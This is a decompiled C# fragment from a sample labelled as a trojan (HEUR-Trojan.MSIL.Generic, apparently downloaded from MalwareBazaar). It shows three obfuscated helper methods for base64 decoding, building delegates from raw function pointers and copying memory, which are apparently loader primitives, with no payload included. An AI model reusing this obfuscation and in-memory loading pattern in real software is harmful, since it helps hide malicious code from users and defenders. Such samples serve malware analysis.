// Decompiled with JetBrains decompiler
// Type: My.MyApplication
// Assembly: ROD, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E979E2DB-C9F1-42A2-973C-8D09E8A5042D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Generic-6729ed2ad627d1ba321c50ea02bf4839564ecf122398fe54f78429c0e1c190c4.exe

using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace My
{
  [EditorBrowsable(EditorBrowsableState.Never)]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class MyApplication : ApplicationBase
  {
    internal static byte[] Ⴈ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 64:
          num1 = 5;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_8;
          case 1:
            num2 = 2;
            continue;
          case 2:
          case 3:
            goto label_3;
          case 6:
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴈ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return Convert.FromBase64String(obj0);
    }

    internal static Delegate Ⴍ([In] IntPtr obj0, [In] Type obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 105:
          num1 = 0;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_8;
          case 3:
          case 6:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴍ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return Marshal.GetDelegateForFunctionPointer(obj0, obj1);
    }

    internal static void Ⴅ(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] int obj6)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_8;
          case 2:
          case 3:
            num1 = 0;
            continue;
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj6 ^ obj5)
            {
              case 120:
                num2 = 5;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
    }
  }
}
